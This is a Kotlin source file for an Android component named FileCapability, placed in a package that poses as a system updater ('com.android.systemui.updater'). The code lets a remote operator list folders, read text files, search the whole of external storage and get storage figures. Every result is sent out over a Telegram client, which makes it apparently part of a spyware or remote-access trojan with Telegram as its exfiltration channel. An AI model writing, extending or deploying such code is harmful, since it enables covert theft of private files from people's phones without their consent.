package com.android.systemui.updater.capabilities

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Environment
import androidx.core.content.ContextCompat
import com.android.systemui.updater.TelegramClient
import java.io.File

class FileCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    fun list(path: String) {
        if (!hasStoragePermission()) {
            telegram.sendText("❌ Storage permission denied")
            return
        }
        val dir = File(path)
        if (!dir.exists() || !dir.isDirectory) {
            telegram.sendText("❌ Invalid directory: $path")
            return
        }
        val files = dir.listFiles() ?: emptyArray()
        val sorted = files.sortedWith(compareBy({ !it.isDirectory }, { it.name }))
        val sb = StringBuilder("📂 $path (${sorted.size})\n━━━━━━━━━━━━━━━━\n")
        sorted.take(100).forEach { f ->
            val icon = if (f.isDirectory) "📁" else "📄"
            val size = if (f.isDirectory) "" else " (${f.length() / 1024} KB)"
            sb.appendLine("$icon ${f.name}$size")
        }
        if (sorted.size > 100) sb.appendLine("...and ${sorted.size - 100} more")
        telegram.sendText(sb.toString())
    }

    fun read(path: String) {
        if (!hasStoragePermission()) {
            telegram.sendText("❌ Storage permission denied")
            return
        }
        val file = File(path)
        if (!file.exists() || !file.isFile) {
            telegram.sendText("❌ File not found: $path")
            return
        }

        if (file.length() > 100 * 1024) {
            telegram.sendText("❌ File too large (max 100KB for text preview)")
            return
        }

        val text = file.readText(Charsets.UTF_8)
        if (text.isBlank()) {
            telegram.sendText("📄 File is empty")
        } else {
            telegram.sendText("📄 Content of $path:\n```\n$text\n```")
        }
    }

    fun find(name: String) {
        if (!hasStoragePermission()) {
            telegram.sendText("❌ Storage permission denied")
            return
        }
        val start = Environment.getExternalStorageDirectory()
        val results = mutableListOf<File>()
        try {
            findRecursive(start, name, results)
        } catch (e: Exception) {
            // ignore
        }
        val sb = StringBuilder("🔍 Found ${results.size} files matching '$name':\n━━━━━━━━━━━━━━━━\n")
        results.take(50).forEach { sb.appendLine(it.absolutePath) }
        if (results.size > 50) sb.appendLine("...and ${results.size - 50} more")
        telegram.sendText(sb.toString())
    }

    private fun findRecursive(dir: File, name: String, out: MutableList<File>) {
        if (!dir.canRead()) return
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) {
                findRecursive(f, name, out)
            } else if (f.name.contains(name, ignoreCase = true)) {
                out.add(f)
            }
        }
    }

    fun storageInfo() {
        val external = Environment.getExternalStorageDirectory()
        val stat = StatFs(external.path)
        val total = stat.blockCountLong * stat.blockSizeLong
        val free = stat.availableBlocksLong * stat.blockSizeLong
        telegram.sendText(
            "💾 Storage:\nTotal: ${total / (1024*1024)} MB\nFree: ${free / (1024*1024)} MB"
        )
    }

    private fun hasStoragePermission(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
}
